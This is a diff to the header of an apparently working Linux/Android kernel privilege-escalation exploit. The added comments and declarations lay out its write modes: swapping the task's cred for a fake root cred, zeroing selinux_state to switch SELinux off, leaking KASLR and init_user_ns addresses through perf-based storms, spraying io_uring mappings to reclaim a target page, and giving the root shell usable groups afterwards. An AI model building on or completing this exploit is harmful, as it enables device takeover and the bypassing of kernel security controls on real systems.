@@ -204,6 +204,20 @@
 #define PSELECT_WRITE_SHAPE_DEFAULT 1
 #define GHOST_MAX_PLANS 8
 #define ROUTE_WAIT_SECONDS 1
+
+/* pselect_custom_write modes:
+ *   5 = generic rb_erase write (selftest uses it against the spray page)
+ *   6 = cred swap: plan0 task->cred = fake_cred, plan1 task->real_cred
+ *   7 = SELinux-off + cred swap: plan0 ZERO-writes the first qword of
+ *       selinux_state (enforcing/checkreqprot/initialized/policycap[0..4]),
+ *       then plan1/plan2 = cred/real_cred like mode 6. Three planned erases
+ *       need three rungs of the consumer's monotonic nice ladder
+ *       (0->7->14->19) - exactly what mode 7 has available. */
+#define WRITE_MODE_CRED 6
+#define WRITE_MODE_CRED_SELINUX 7
+static inline int write_mode_is_cred(int m) {
+  return m == WRITE_MODE_CRED || m == WRITE_MODE_CRED_SELINUX;
+}
 #define EARLY_PIPE_PREPARE 0
 #define SLIDE_NFULNL_LOGGER \
   P0_DATA_ALIAS_CONST(SLIDE_NFULNL_LOGGER_IMAGE)
@@ -317,6 +331,28 @@ extern atomic_int consumer_walks_done;
  * W0_OFF + 0x18) appearing in one of the uring mappings after a
  * sched_setattr call. */
 extern atomic_int consumer_erase_hits;
+/* SELinux-off diagnostics filled by run_main_route_threads after the last
+ * walk (raw syscalls only - the main thread must not call libc past this
+ * point, see the hb-lock wedge notes in HANDOVER_2). */
+extern int g_selinux_write_armed;   /* mode-7 plan was armed (kaslr sane) */
+extern int g_selinux_off;           /* /sys/fs/selinux/enforce read back 0 */
+extern uintptr_t g_selinux_target;  /* kaslr_base + off_selinux_enforcing */
+/* The LIVE &init_user_ns address (validated by the perf leak): used as
+ * fake_cred->user_ns (cap_capable only COMPARES it - first iteration
+ * matches) and required for the MOVABLE-storm capture. 0 = not leaked. */
+extern uintptr_t g_init_user_ns_addr;
+/* The setpriority-storm perf leak's ranked image-range candidates
+ * (filled by validate_device_symbol_layout, both modes). The selinux
+ * leak cross-checks its own candidates against this list: &selinux_state
+ * is live in registers during BOTH the capable() path (selinux_capable)
+ * and the file-open path (selinux_file_open), so the true address must
+ * appear in both storms' candidate sets. */
+extern uintptr_t g_ns_cands[16];
+extern int g_ns_cand_count;
+/* uring_block() index whose W0.pi_tree.pc showed the erase marker, or
+ * -1: lets the post-root code know whether the captured block was a
+ * full 16KB mapping (uring/spectrum: exec-safe) or a 4KB storm block. */
+extern int g_hit_block;
 /* Current rung of the consumer's monotonic nice ladder (7, 14, 19).
  * NEVER reset between overlay rounds: every sched_setattr must be a
  * real priority change (GATE A: a no-op exits early without walking;
@@ -445,12 +481,37 @@ extern pid_t root_child_pid;
 extern int root_ready_pipe[2];
 extern struct root_shared *root_shared;
 extern int memfd_leak;
-#define URING_MAX 256
+#define URING_MAX 512
 extern int uring_fd;
 extern void *uring_sqes;
 extern int uring_count;
 extern int uring_fds[URING_MAX];
 extern void *uring_maps[URING_MAX];
+extern size_t uring_mapsz[URING_MAX];
+extern size_t uring_mapstride[URING_MAX]; /* payload block stride: MM_SLAB_SIZE for rings/sqes, 0x1000 for the storm */
+/* first uring_block() index that belongs to the MOVABLE-storm region
+ * (-1 when no storm was registered); blocks >= this are 4KB user-page
+ * blocks whose neighbors (mm page base pages 1..3) are NOT payload -
+ * such captures must not execve (the fake cred's page-1 fields are
+ * garbage there). */
+extern long g_storm_block_start;
+/* Real shell supplementary groups, published by the relay child before
+ * the exploit and baked into the fake cred's group_info: post-root DAC
+ * needs them (/data/local/tmp is drwxrwx--x shell:shell, so uid 0 is
+ * "other" with only --x; the group bits are the clean pass) and so does
+ * /proc visibility (mounted hidepid=invisible,gid=3009). */
+extern int g_fake_ngrps;
+extern uint32_t g_fake_grps[16];
+/* Walk every 16KB payload sub-block across the tracked io_uring mappings:
+ *   for (int bi = 0; (pg = uring_block(bi)) != NULL; bi++) ...
+ * For order-2 rings (entries=256) this yields exactly one block per
+ * mapping at offset 0 - the legacy behavior. Multi-order spectrum rings
+ * (orders 3..7) carry an independent payload copy in every 16KB
+ * sub-block, so whichever sub-block is the reclaimed mm page presents
+ * the full fake lock/waiter/task layout with self-consistent pointers
+ * (the template is built for the mm page VA; the sub-block that IS the
+ * mm page backs exactly those kernel addresses). */
+uint8_t *uring_block(int idx);
 extern unsigned char *skb_buf; /* payload template (SQE/rings pre-copy) */
 extern int g_skb_reclaim;      /* target reclaimed as skb data (recv readback) */
 int skb_reclaim_readback(void);          /* drain all queued skbs */
